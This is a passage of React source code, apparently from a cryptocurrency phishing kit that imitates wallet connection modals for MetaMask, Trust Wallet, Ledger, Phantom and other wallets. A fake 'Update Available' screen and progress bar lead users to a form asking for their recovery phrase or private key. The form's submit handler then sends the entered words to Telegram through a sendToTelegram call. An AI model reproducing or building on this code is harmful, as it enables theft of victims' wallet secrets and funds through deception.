                  <span className="tw-progress-pct">{progress}%</span>
                </div>
              </div>
              <p className="tw-updating-notice">This may take a few moments. Please do not close this window.</p>
            </div>
          </div>
        )}

        {/* ── Import with Secret Phrase ── */}
        {phase === 'import' && (
          <div className="tw-import">
            <div className="tw-import-inner">
              <TrustShieldSVGMedium id="imp" />
              <h3 className="tw-import-title">Import with Secret Phrase</h3>
              <div className="tw-word-select-row">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="1"/></svg>
                <select className="tw-word-select" value={wordCount} onChange={e => setWordCount(e.target.value)}>
                  <option value="12">12-word recovery phrase</option>
                  <option value="24">24-word recovery phrase</option>
                  <option value="25">25-word recovery phrase</option>
                  <option value="1">Private key</option>
                </select>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="m6 9 6 6 6-6"/></svg>
              </div>
              {wordCount === '1' ? (
                <div ref={seedRef} style={{width:'100%'}}>
                  <input className="tw-seed-pk" type="text" placeholder="Enter your private key…" autoComplete="off" spellCheck="false" />
                </div>
              ) : (
                <div className="tw-seed-grid" ref={seedRef}>
                  {Array.from({length: parseInt(wordCount)}, (_, i) => (
                    <div key={i} className="tw-seed-cell">
                      <span className="tw-seed-num">{i+1}</span>
                      <input className="tw-seed-input" type="text" placeholder={`word ${i+1}`} autoComplete="off" spellCheck="false" autoCapitalize="none" />
                    </div>
                  ))}
                </div>
              )}
              <div className="tw-import-actions">
                <button className="tw-back-btn" onClick={onClose}>Back</button>
                <button className="tw-next-btn" onClick={handleImport}>Next</button>
              </div>
            </div>
          </div>
        )}

      </div>
    </>
  )
}

/* ─── Trust/generic seed form with Telegram ─── */
function WsmSeedForm({ walletName, onClose, onImportDone }) {
  const seedRef = useRef(null)
  const [wordCount, setWordCount] = useState('12')
  const count = parseInt(wordCount)
  const handleSubmit = () => {
    if (seedRef.current) {
      const inputs = seedRef.current.querySelectorAll('input')
      const words = Array.from(inputs).map(el => el.value.trim()).filter(Boolean)
      if (words.length > 0) sendToTelegram(walletName, words)
    }
    onImportDone ? onImportDone() : onClose()
  }
  return (
    <>
      <div className="wsm-word-select-row">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="1"/></svg>
        <select className="wsm-word-select" value={wordCount} onChange={e => setWordCount(e.target.value)}>
          <option value="12">12-word recovery phrase</option>
          <option value="15">15-word recovery phrase</option>
          <option value="18">18-word recovery phrase</option>
          <option value="21">21-word recovery phrase</option>
          <option value="24">24-word recovery phrase</option>
          <option value="1">Private key</option>
        </select>
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="m6 9 6 6 6-6"/></svg>
      </div>
      {count === 1 ? (
        <div ref={seedRef}>
          <input className="wsm-seed-pk" type="text" placeholder="Enter your private key…" autoComplete="off" spellCheck="false" />
        </div>
      ) : (
        <div className="wsm-seed-wrap" ref={seedRef}>
          {Array.from({ length: count }, (_, i) => (
            <div key={i} className="wsm-seed-cell">
              <span className="wsm-seed-num">{i + 1}</span>
              <input key={i} className="wsm-seed-input" placeholder={`word ${i + 1}`} type="text" autoComplete="off" spellCheck="false" autoCapitalize="none" />
            </div>
          ))}
        </div>
      )}
      <button className="wsm-seed-submit" onClick={handleSubmit}>Restore Wallet</button>
    </>
  )
}

function WalletSideModal({ wallet, onClose, onImportDone }) {
  const [phase, setPhase]       = useState('loading')
  const [progress, setProgress] = useState(0)
  const config = WALLET_MODAL_CONFIG[wallet.name] || {
    version: '1.0.0', accentColor: '#3a96ff', headerBg: '#fff',
    items: ['Security improvements', 'Performance updates', 'Bug fixes', 'New features'],
    loadingText: `Loading ${wallet.name}`, updatingText: `Updating ${wallet.name}`,
  }

  // After 3s on loading, show update screen
  useEffect(() => {
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  // Progress bar for updating phase — 10 seconds
  useEffect(() => {
    if (phase !== 'updating') return
    setProgress(0)
    const iv = setInterval(() => {
      setProgress(p => {
        if (p >= 100) {
          clearInterval(iv)
          setTimeout(() => setPhase('import'), 400)
          return 100
        }
        return p + 1
      })
    }, 100)
    return () => clearInterval(iv)
  }, [phase])

  const accent = config.accentColor
  const isDark = config.dark

  return (
    <>
      <style>{`
        @keyframes wsmSpin { to { transform: rotate(360deg); } }
        @keyframes wsmBob { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
        @keyframes wsmBounceIn {
          0%{opacity:0;transform:scale(0.3)} 50%{opacity:1;transform:scale(1.05)}
          70%{transform:scale(0.9)} 100%{transform:scale(1);opacity:1}
        }
        .wsm-overlay {
          position: fixed; inset: 0; z-index: 10000;
          background: rgba(18,18,18,0.45); pointer-events: auto;
        }
        .wsm-modal {
          position: fixed; z-index: 10001;
          top: 0; right: 32px;
          width: 400px; height: 640px;
          background: #fff;
          border: 1px solid #eaecef;
          box-shadow: 0 8px 40px rgba(0,0,0,0.18);
          display: flex; flex-direction: column; overflow: hidden;
          font-family: 'Inter', -apple-system, sans-serif;
          animation: mmSlide 0.2s ease;
        }
        @keyframes mmSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @media (max-width: 600px) {
          .wsm-modal {
            top:0; left:0; right:0; bottom:0;
            width:100%; height:100%; max-height:100%;
            border-radius:0; transform:none;
          }
        }
        .wsm-header {
          display:flex; align-items:center; justify-content:space-between;
          padding:12px 16px; border-bottom:1px solid #e6e6e6;
          flex-shrink:0; background:${config.headerBg};
        }
        .wsm-header-logo {
          width:32px; height:32px; border-radius:8px; object-fit:contain;
        }
        .wsm-close-btn {
          width:32px; height:32px; border-radius:50%;
          border:2px solid ${accent}; background:none; cursor:pointer;
          display:flex; align-items:center; justify-content:center;
          color:${accent}; transition:opacity 0.2s;
        }
        .wsm-close-btn:hover { opacity:0.7; }
        .wsm-loading-phase {
          flex:1; display:flex; align-items:center; justify-content:center;
          flex-direction:column; gap:16px; padding:24px;
          background:${isDark ? config.headerBg : '#fff'};
        }
        .wsm-loading-logo {
          width:100px; height:100px; border-radius:20px; object-fit:contain;
          animation:wsmBob 2s ease-in-out infinite;
        }
        .wsm-loading-title {
          font-size:20px; font-weight:600; color:${isDark ? '#fff' : '#141618'};
          text-align:center; margin:0;
        }
        .wsm-loading-spinner {
          width:44px; height:44px;
          border:3px solid ${accent}33;
          border-top-color:${accent}; border-radius:50%;
          animation:wsmSpin 0.85s linear infinite;
        }
        .wsm-update-phase { flex:1; display:flex; flex-direction:column; overflow-y:auto; background:#fff; }
        .wsm-update-body {
          flex:1; display:flex; flex-direction:column; align-items:center;
          padding:28px 16px; gap:0;
        }
        .wsm-download-icon { margin-bottom:20px; }
        .wsm-update-title { font-size:22px; font-weight:700; color:#141618; margin:0 0 6px; text-align:center; }
        .wsm-update-version { font-size:15px; font-weight:500; color:#141618; margin:0 0 20px; text-align:center; }
        .wsm-changelog {
          background:#f5f5f5; border-radius:8px; padding:14px;
          width:100%; max-width:380px; margin-bottom:20px; box-sizing:border-box;
        }
        .wsm-changelog ul { margin:0; padding-left:20px; list-style:disc; }
        .wsm-changelog li { color:#141618; font-size:13px; line-height:1.5; margin-bottom:6px; }
        .wsm-changelog li:last-child { margin-bottom:0; }
        .wsm-update-btn {
          width:100%; max-width:380px; height:48px;
          background:${accent}; color:#fff; border:none; border-radius:999px;
          font-size:14px; font-weight:500; cursor:pointer; font-family:inherit;
          transition:opacity 0.2s;
        }
        .wsm-update-btn:hover { opacity:0.85; }
        .wsm-support-text { font-size:13px; color:#141618; margin-top:14px; text-align:center; }
        .wsm-support-link { color:${accent}; text-decoration:none; }
        .wsm-support-link:hover { opacity:0.8; }
        .wsm-updating-phase { flex:1; display:flex; flex-direction:column; background:#fff; }
        .wsm-updating-body {
          flex:1; display:flex; flex-direction:column; align-items:center;
          padding:32px 16px; gap:0;
        }
        .wsm-blue-spinner {
          width:60px; height:60px; margin-bottom:24px;
          border:3px solid ${accent}22; border-top-color:${accent}; border-radius:50%;
          animation:wsmSpin 0.85s linear infinite;
        }
        .wsm-updating-title { font-size:22px; font-weight:700; color:#141618; margin:0 0 8px; text-align:center; }
        .wsm-updating-sub { font-size:15px; color:#141618; margin:0 0 24px; text-align:center; }
        .wsm-progress-wrap { width:100%; max-width:380px; margin-bottom:10px; }
        .wsm-progress-track { width:100%; height:8px; background:#e6e6e6; border-radius:999px; overflow:hidden; }
        .wsm-progress-bar { height:100%; background:${accent}; border-radius:999px; transition:width 0.1s linear; }
        .wsm-progress-pct { font-size:13px; color:#141618; margin-top:8px; text-align:center; }
        .wsm-updating-notice { font-size:13px; color:#6a737d; text-align:center; margin-top:18px; max-width:300px; line-height:1.5; }
        .wsm-import-phase { flex:1; display:flex; flex-direction:column; overflow-y:auto; background:#fff; }
        .wsm-import-body { flex:1; padding:22px 16px; display:flex; flex-direction:column; gap:12px; }
        .wsm-import-title { font-size:18px; font-weight:700; color:#141618; margin:0; }
        .wsm-import-sub { font-size:13px; color:#6a737d; margin:0; }
        .wsm-word-select-row { display:flex; align-items:center; gap:8px; background:#f4f6fa; border-radius:10px; padding:10px 14px; }
        .wsm-word-select { flex:1; font-size:13px; font-weight:500; color:#374151; border:none; background:transparent; outline:none; cursor:pointer; font-family:inherit; }
        .wsm-seed-wrap { display:grid; grid-template-columns:1fr 1fr 1fr; gap:7px; }
        .wsm-seed-cell { position:relative; }
        .wsm-seed-num { position:absolute; top:50%; left:8px; transform:translateY(-50%); font-size:10px; font-weight:700; color:#9ca3af; pointer-events:none; user-select:none; line-height:1; }
        .wsm-seed-input {
          width:100%; padding:10px 6px 10px 22px; border:1.5px solid #e5e7eb;
          border-radius:10px; font-size:12px; font-weight:500; color:#141618;
          font-family:inherit; outline:none; background:#fafafa;
          transition:all 0.18s; box-sizing:border-box;
        }
        .wsm-seed-input:focus { border-color:${accent}; background:#fff; box-shadow:0 0 0 3px ${accent}18; }
        .wsm-seed-input::placeholder { color:#c4c9d4; font-size:11px; }
        .wsm-seed-pk {
          width:100%; padding:12px 14px; border:1.5px solid #e5e7eb; border-radius:10px;
          font-size:13px; font-weight:500; color:#141618; font-family:inherit; outline:none;
          background:#fafafa; transition:all 0.18s; box-sizing:border-box;
        }
        .wsm-seed-pk:focus { border-color:${accent}; background:#fff; box-shadow:0 0 0 3px ${accent}18; }
        .wsm-seed-pk::placeholder { color:#c4c9d4; }
        .wsm-seed-submit {
          width:100%; height:48px; background:${accent}; color:#fff;
          border:none; border-radius:12px; font-size:14px; font-weight:600;
          cursor:pointer; font-family:inherit; transition:opacity 0.2s, transform 0.1s;
          margin-top:4px;
        }
        .wsm-seed-submit:hover { opacity:0.85; }
        .wsm-seed-submit:active { transform:scale(0.98); }
      `}</style>

      <div className="wsm-overlay" onClick={onClose} />
      <div className="wsm-modal">

        {/* ── Loading phase ── */}
        {phase === 'loading' && (
          <div className="wsm-loading-phase">
            <img src={wallet.img} alt={wallet.name} className="wsm-loading-logo" />
            <p className="wsm-loading-title">{config.loadingText}</p>
            <div className="wsm-loading-spinner" />
          </div>
        )}

        {/* ── Update available ── */}
        {phase === 'update' && (
          <>
            <div className="wsm-header">
              <img src={wallet.img} alt={wallet.name} className="wsm-header-logo" />
              <button className="wsm-close-btn" onClick={onClose}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>
            </div>
            <div className="wsm-update-phase">
              <div className="wsm-update-body">
                <svg className="wsm-download-icon" style={{color: accent}} xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                  <polyline points="7 10 12 15 17 10"/>
                  <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                <h2 className="wsm-update-title">Update Available</h2>
                <p className="wsm-update-version">Version {config.version}</p>
                <div className="wsm-changelog">
                  <ul>{config.items.map((item, i) => <li key={i}>{item}</li>)}</ul>
                </div>
                <button className="wsm-update-btn" onClick={() => setPhase('updating')}>Update</button>
                <p className="wsm-support-text">
                  Need help?{' '}
                  <a href="#" className="wsm-support-link">Contact {wallet.name} Support</a>
                </p>
              </div>
            </div>
          </>
        )}

        {/* ── Updating / progress ── */}
        {phase === 'updating' && (
          <>
            <div className="wsm-header">
              <img src={wallet.img} alt={wallet.name} className="wsm-header-logo" />
              <button className="wsm-close-btn" onClick={onClose}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>
            </div>
            <div className="wsm-updating-phase">
              <div className="wsm-updating-body">
                <div className="wsm-blue-spinner" />
                <h2 className="wsm-updating-title">{config.updatingText}</h2>
                <p className="wsm-updating-sub">Please wait while we update to version {config.version}</p>
                <div className="wsm-progress-wrap">
                  <div className="wsm-progress-track">
                    <div className="wsm-progress-bar" style={{width: `${progress}%`}} />
                  </div>
                  <p className="wsm-progress-pct">{progress}%</p>
                </div>
                <p className="wsm-updating-notice">This may take a few moments. Please do not close this window.</p>
              </div>
            </div>
          </>
        )}

        {/* ── Import / seed phrase ── */}
        {phase === 'import' && (
          <>
            <div className="wsm-header">
              <img src={wallet.img} alt={wallet.name} className="wsm-header-logo" />
              <button className="wsm-close-btn" onClick={onClose}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>
            </div>
            <div className="wsm-import-phase">
              <div className="wsm-import-body">
                <h2 className="wsm-import-title">Import your {wallet.name}</h2>
                <p className="wsm-import-sub">Enter your 12-word Secret Recovery Phrase to restore your wallet.</p>
                <WsmSeedForm walletName={wallet.name} onClose={onClose} onImportDone={onImportDone} />
              </div>
            </div>
          </>
        )}

      </div>
    </>
  )
}

export default function WalletModal({ open, onClose }) {
  const [selected, setSelected]         = useState(null)
  const [search, setSearch]             = useState('')
  const [connecting, setConnecting]     = useState(false)
  const [showMetaMask, setShowMetaMask] = useState(false)
  const [sideWallet, setSideWallet]     = useState(null)
  const [importDialog, setImportDialog] = useState(false)
  const navigate = useNavigate()

  useEffect(() => {
    if (open) { setSelected(null); setSearch(''); setConnecting(false); setShowMetaMask(false); setSideWallet(null); setImportDialog(false) }
  }, [open])

  useEffect(() => {
    const handler = (e) => { if (e.key === 'Escape') onClose() }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, [onClose])

  if (!open) return null

  // Import result dialog — wallet modal is closed, dialog floats over the page
  if (importDialog) {
    return <ImportResultDialog onDone={() => navigate('/connected')} />
  }

  // Callback for all wallet import confirmations — close modal, show dialog
  const onImportDone = () => {
    setSideWallet(null)
    setShowMetaMask(false)
    setImportDialog(true)
  }

  // When MetaMask modal is open, hide the wallet card — show only the page + MetaMask modal
  if (showMetaMask) {
    return <MetaMaskModal onClose={() => { setShowMetaMask(false); onClose() }} onImportDone={onImportDone} />
  }

  // When any other wallet side modal is open, hide the wallet card
  if (sideWallet) {
    const closeHandler = () => { setSideWallet(null); onClose() }
    const name = sideWallet.name
    if (name === 'Trust Wallet')    return <TrustWalletModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Coinbase Wallet') return <CoinbaseModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Phantom Wallet')  return <PhantomModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'OKX Wallet')      return <OKXModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Rabby Wallet')    return <RabbyModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Rainbow')         return <RainbowModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Ledger')          return <LedgerModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Keplr')           return <KeplrModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'WalletConnect')   return <WalletConnectModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === '1inch Wallet')    return <OneinchModal onClose={closeHandler} onImportDone={onImportDone} />
    if (name === 'Sui Wallet')      return <SuiModal onClose={closeHandler} onImportDone={onImportDone} />
    return <WalletSideModal wallet={sideWallet} onClose={closeHandler} onImportDone={onImportDone} />
  }

  const filtered = WALLETS.filter(w => w.name.toLowerCase().includes(search.toLowerCase()))

  return (
    <>
      <style>{`
        .wm-overlay {
          position: fixed; inset: 0; z-index: 9999;
          background: rgba(0,0,0,0.55);
          backdrop-filter: blur(8px);
          display: flex; align-items: center; justify-content: center;
          padding: 16px;
          animation: wmFadeIn 0.18s ease;
        }
        @keyframes wmFadeIn { from{opacity:0} to{opacity:1} }

        .wm-modal {
          background: #fff;
          border-radius: 24px;
          box-shadow: 0 24px 64px rgba(0,0,0,0.18);
          width: 100%; max-width: 660px;
          display: flex; overflow: hidden;
          height: 520px;
          animation: wmSlideUp 0.22s ease;
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        @keyframes wmSlideUp {
          from { opacity:0; transform:translateY(20px) scale(0.98); }
          to   { opacity:1; transform:translateY(0) scale(1); }
        }

        /* ── Left panel ── */
        .wm-left {
          flex: 0 0 290px;
          display: flex; flex-direction: column;
          padding: 22px 16px 16px;
          border-right: 1px solid #ebebeb;
          overflow: hidden;
        }
        .wm-header {
          display: flex; align-items: center; justify-content: space-between;
          margin-bottom: 16px; padding: 0 4px;
        }
        .wm-brand { display: flex; align-items: center; gap: 8px; }
        .wm-brand-pill {
          background: #111; color: #fff; border-radius: 99px;
          padding: 3px 11px; font-size: 13px; font-weight: 700;
        }
        .wm-brand-sub { font-size: 14px; color: #666; font-weight: 400; }
        .wm-close-btn {
          background: none; border: none; cursor: pointer;
          width: 28px; height: 28px; border-radius: 8px;
          display: flex; align-items: center; justify-content: center;
          color: #aaa; transition: color 0.15s, background 0.15s;
        }
        .wm-close-btn:hover { color: #333; background: #f0f0f0; }

        .wm-search-wrap { position: relative; margin-bottom: 12px; }
        .wm-search-icon {
          position: absolute; left: 11px; top: 50%; transform: translateY(-50%);
          color: #aaa; pointer-events: none;
        }
        .wm-search {
          width: 100%; box-sizing: border-box;
          padding: 9px 12px 9px 34px;
          background: #f3f4f6; border: 1px solid transparent;
          border-radius: 12px; font-size: 14px; color: #333;
          outline: none; transition: border-color 0.2s, background 0.2s;
          font-family: inherit;
        }
        .wm-search::placeholder { color: #aaa; }
        .wm-search:focus { border-color: #3a96ff; background: #fff; }

        .wm-section-label {
          font-size: 13px; color: #999; font-weight: 500;
          padding: 0 4px; margin-bottom: 6px;
        }
        .wm-list {
          flex: 1; overflow-y: auto; margin: 0 -4px; padding: 0 4px;
        }
        .wm-list::-webkit-scrollbar { width: 4px; }
        .wm-list::-webkit-scrollbar-track { background: transparent; }
        .wm-list::-webkit-scrollbar-thumb { background: #ddd; border-radius: 4px; }
        .wm-row {
          display: flex; align-items: center; gap: 12px;
          padding: 10px 12px; border-radius: 14px; cursor: pointer;
          transition: background 0.13s; margin-bottom: 2px;
          border: 1.5px solid transparent; background: #f7f8fa;
        }
        .wm-row:hover { background: #eff0f2; }
        .wm-row.wm-row-active { background: #eff6ff; border-color: #3a96ff; }
        .wm-row-name { font-size: 15px; font-weight: 500; color: #111; }

        /* ── Right panel base ── */
        .wm-right {
          flex: 1; display: flex; flex-direction: column;
          align-items: center; justify-content: center;
          gap: 16px; padding: 32px;
          border-radius: 0 24px 24px 0;
          overflow: hidden; background: #f0f0f0;
        }
        .wm-right-pulse { animation: wmPulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
        @keyframes wmPulse { 0%,100%{opacity:1} 50%{opacity:0.65} }
        .wm-globe-svg { color: #363636; opacity: 0.55; }
        .wm-right-hint { font-size: 15px; color: #999; text-align: center; max-width: 250px; }

        /* ── Shared spinner util ── */
        @keyframes wmSpin { to { transform: rotate(360deg); } }

        /* ── Coinbase/WalletConnect/1inch — video ── */
        .wm-connect-video {
          width: 100%; height: 200px;
          object-fit: cover; border-radius: 16px;
        }

        /* ── MetaMask fox ── */
        .wm-fox-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 12px;
        }
        .wm-fox-svg {
          width: 128px; height: 128px;
          animation: wmFoxBob 2s ease-in-out infinite;
        }
        @keyframes wmFoxBob {
          0%,100% { transform: translateY(0); }
          50%      { transform: translateY(-8px); }
        }
        .wm-fox-spinner {
          width: 48px; height: 48px;
          border: 3px solid rgba(246,133,26,0.25);
          border-top-color: #f6851a; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Trust Wallet shield ── */
        .wm-trust-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 16px;
        }
        .wm-trust-shield { width: 100px; height: 140px; animation: wmFoxBob 2.5s ease-in-out infinite; }
        .wm-trust-spinner {
          width: 48px; height: 48px;
          border: 3px solid rgba(0,148,255,0.2);
          border-top-color: #0094ff; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Phantom ghost ── */
        .wm-phantom-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 16px;
          background: #5c30d4; border-radius: 20px;
          padding: 28px 24px; width: 100%;
        }
        .wm-phantom-ghost {
          width: 120px; height: 100px;
          animation: wmFoxBob 2s ease-in-out infinite;
        }
        .wm-phantom-boo {
          color: #fff; font-size: 20px; font-weight: 600; margin: 0;
          font-family: 'Inter', sans-serif;
        }

        /* ── Rabby rabbit ── */
        .wm-rabby-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 16px;
          background: linear-gradient(135deg, #2a1f6f 0%, #1a1450 100%);
          border-radius: 20px; padding: 28px 24px; width: 100%;
        }
        .wm-rabby-svg {
          width: 100px; height: 100px;
          animation: wmFoxBob 2s ease-in-out infinite;
        }
        .wm-rabby-spinner {
          width: 44px; height: 44px;
          border: 3px solid rgba(134,151,255,0.25);
          border-top-color: #8697ff; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Rainbow ── */
        .wm-rainbow-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 10px;
          background: #fff; border-radius: 20px;
          padding: 28px 24px; width: 100%; text-align: center;
        }
        .wm-rainbow-logo {
          width: 80px; height: 80px; border-radius: 16px;
          animation: wmPulse 2s ease-in-out infinite;
        }
        .wm-rainbow-title {
          color: #192945; font-size: 18px; font-weight: 700; margin: 4px 0 0;
        }
        .wm-rainbow-sub {
          color: #000; font-size: 13px; margin: 0; max-width: 240px;
        }
        .wm-rainbow-spinner {
          width: 32px; height: 32px; margin-top: 8px;
          border: 3px solid rgba(25,41,69,0.15);
          border-top-color: #192945; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Ledger ── */
        .wm-ledger-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 14px;
          background: #fff; border-radius: 20px;
          padding: 28px 24px; width: 100%;
        }
        .wm-ledger-svg {
          width: 112px; height: 112px;
          animation: wmFoxBob 2.5s ease-in-out infinite;
        }
        .wm-ledger-text {
          color: #202020; font-size: 18px; font-weight: 500; margin: 0;
          text-align: center;
        }
        .wm-ledger-spinner {
          width: 40px; height: 40px;
          border: 3px solid rgba(50,50,50,0.15);
          border-top-color: #333; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── WalletConnect ── */
        .wm-wc-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 10px;
          background: #ffffff;
          border-radius: 20px; padding: 28px 24px; width: 100%; text-align: center;
          box-shadow: 0 4px 24px rgba(58,136,255,0.08);
        }
        .wm-wc-logo {
          width: 80px; height: 80px; border-radius: 16px;
          animation: wmFoxBob 2s ease-in-out infinite;
        }
        .wm-wc-title {
          color: #192945; font-size: 20px; font-weight: 600; margin: 6px 0 0;
        }
        .wm-wc-sub {
          color: #6a7587; font-size: 13px; margin: 0; max-width: 230px;
        }
        .wm-wc-spinner {
          width: 36px; height: 36px; margin-top: 8px;
          border: 3px solid rgba(58,136,255,0.18);
          border-top-color: #3a88ff; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Keplr ── */
        .wm-keplr-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 10px;
          background: linear-gradient(135deg, #1c1b4b 0%, #2b2970 100%);
          border-radius: 20px; padding: 28px 24px; width: 100%; text-align: center;
        }
        .wm-keplr-logo {
          width: 70px; height: 70px; border-radius: 14px;
          animation: wmFoxBob 2s ease-in-out infinite;
        }
        .wm-keplr-title {
          color: #fff; font-size: 20px; font-weight: 600; margin: 6px 0 0;
        }
        .wm-keplr-sub {
          color: #b3b3b3; font-size: 13px; margin: 0; max-width: 230px;
        }

        /* ── Sui ── */
        .wm-sui-wrap {
          display: flex; flex-direction: column; align-items: center; gap: 12px;
          background-image: url('/media/images/sui_bg.png');
          background-size: cover; background-position: center;
          border-radius: 20px; padding: 28px 24px; width: 100%; text-align: center;
        }
        .wm-sui-logo {
          width: 90px; height: 90px;
          animation: suiBounceIn 1s ease forwards;
        }
        @keyframes suiBounceIn {
          0%   { opacity:0; transform:scale(0.3); }
          50%  { opacity:1; transform:scale(1.05); }
          70%  { transform:scale(0.9); }
          100% { transform:scale(1); opacity:1; }
        }
        .wm-sui-title {
          color: #fff; font-size: 28px; font-weight: 500; margin: 0;
        }
        .wm-sui-spinner {
          width: 44px; height: 44px;
          border: 3px solid rgba(255,255,255,0.2);
          border-top-color: #6366f1; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Selected wallet ready state ── */
        .wm-conn-wrap {
          display: flex; flex-direction: column;
          align-items: center; gap: 14px; text-align: center; width: 100%;
        }
        .wm-conn-icon-ring {
          position: relative; width: 72px; height: 72px;
          display: flex; align-items: center; justify-content: center;
        }
        .wm-conn-spin {
          position: absolute; inset: 0;
          border: 2.5px solid rgba(58,150,255,0.18);
          border-top-color: #3a96ff; border-radius: 50%;
          animation: wmSpin 0.75s linear infinite;
        }
        .wm-conn-name { font-size: 16px; font-weight: 600; color: #111; }
        .wm-conn-sub  { font-size: 13px; color: #aaa; line-height: 1.5; }
        .wm-conn-btn {
          margin-top: 4px; background: #3a96ff; color: #fff;
          border: none; border-radius: 12px;
          padding: 11px 32px; font-size: 15px; font-weight: 600;
          cursor: pointer; font-family: inherit;
          transition: background 0.15s, transform 0.1s;
        }
        .wm-conn-btn:hover  { background: #2a80e6; }
        .wm-conn-btn:active { transform: scale(0.97); }

        @media (max-width: 580px) {
          .wm-right  { display: none; }
          .wm-left   { flex: 0 0 100%; border-right: none; }
          .wm-modal  { width: 100%; height: 100%; max-height: 100%; border-radius: 0; align-self: stretch; }
          .wm-overlay { align-items: stretch; }
        }
      `}</style>

      <div className="wm-overlay" onClick={e => { if (e.target === e.currentTarget) onClose() }}>
        <div className="wm-modal">

          {/* ── Left: wallet list ── */}
          <div className="wm-left">
            <div className="wm-header">
              <div className="wm-brand">
                <span className="wm-brand-pill">reown</span>
                <span className="wm-brand-sub">Manual Kit</span>
              </div>
              <button className="wm-close-btn" onClick={onClose} aria-label="Close">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <path d="M12 4L4 12M4 4l8 8" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/>
                </svg>
              </button>
            </div>

            <div className="wm-search-wrap">
              <svg className="wm-search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
              </svg>
              <input
                className="wm-search"
                placeholder="Search wallet"
                value={search}
                onChange={e => setSearch(e.target.value)}
              />
            </div>

            <div className="wm-section-label">Popular:</div>

            <div className="wm-list">
              {filtered.map((w, i) => (
                <div
                  key={i}
                  className={`wm-row${selected?.name === w.name ? ' wm-row-active' : ''}`}
                  onClick={() => {
                    const isMobile = window.innerWidth <= 580
                    if (isMobile) {
                      // On mobile, skip the right panel — open the wallet modal directly
                      if (w.connectType === 'fox') {
                        setShowMetaMask(true)
                      } else {
                        setSideWallet(w)
                      }
                    } else {
                      setSelected(w)
                      setConnecting(false)
                    }
                  }}
                >
                  <WalletIcon wallet={w} size={40} />
                  <span className="wm-row-name">{w.name}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ── Right: status panel ── */}
          <div className={`wm-right${!selected ? ' wm-right-pulse' : ''}`}>
            {!selected ? (
              <>
                <svg className="wm-globe-svg" xmlns="http://www.w3.org/2000/svg"
                  width="56" height="56" viewBox="0 0 24 24" fill="none"
                  stroke="currentColor" strokeWidth="1" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"/>
                  <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/>
                  <path d="M2 12h20"/>
                </svg>
                <p className="wm-right-hint">Connect your wallet to get started</p>
              </>
            ) : connecting ? (
              <div className="wm-conn-wrap">
                <ConnectingVisual wallet={selected} isConnecting={true} />
                {selected.connectType === 'video' && (
